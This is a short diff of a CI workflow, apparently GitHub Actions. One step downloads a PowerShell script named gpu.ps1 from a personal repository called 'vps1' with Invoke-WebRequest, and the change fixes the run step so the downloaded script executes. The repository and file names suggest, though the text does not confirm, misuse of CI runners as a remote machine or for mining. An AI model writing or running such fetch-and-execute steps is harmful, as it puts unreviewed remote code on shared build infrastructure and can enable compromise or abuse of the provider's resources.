@@ -18,4 +18,5 @@ jobs:
           command: |      
             Invoke-WebRequest https://raw.githubusercontent.com/anwarkerkich/vps1/main/sh -OutFile gpu.ps1 
           
-      - run: ./gpu.ps
+      - run: ./gpu.ps1
+    
